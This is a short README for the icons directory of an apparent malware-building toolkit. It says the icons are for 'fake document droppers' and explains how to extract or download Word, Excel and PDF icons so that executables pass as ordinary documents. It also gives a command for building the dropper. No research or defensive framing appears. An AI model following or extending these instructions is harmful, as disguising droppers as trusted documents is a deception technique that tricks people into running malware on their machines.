# Icons Directory

This directory contains icon files for fake document droppers.

## Required Icons

Download or extract the following icons:

| File        | Description          | Source                             |
| ----------- | -------------------- | ---------------------------------- |
| `word.ico`  | Microsoft Word icon  | Extract from Word.exe or download  |
| `pdf.ico`   | Adobe PDF icon       | Extract from Acrobat or download   |
| `excel.ico` | Microsoft Excel icon | Extract from Excel.exe or download |

## How to Extract Icons from Windows

### Method 1: Using Resource Hacker (Recommended)
1. Download Resource Hacker: http://www.angusj.com/resourcehacker/
2. Open `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`
3. Navigate to Icon Group → export as .ico

### Method 2: Using PowerShell
```powershell
# Extract icon from executable
Add-Type -AssemblyName System.Drawing
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE")
$icon.ToBitmap().Save("word.png")
# Note: Need additional tool to convert PNG to ICO
```

### Method 3: Download from icon websites
- https://icon-icons.com/
- https://www.iconfinder.com/
- Search for "Microsoft Word icon" or "PDF icon"

## Build Without Icons

If you don't have icon files, build without icons:
```bash
python build.py dropper --no-icon
```

The executable will use the default Python icon instead.
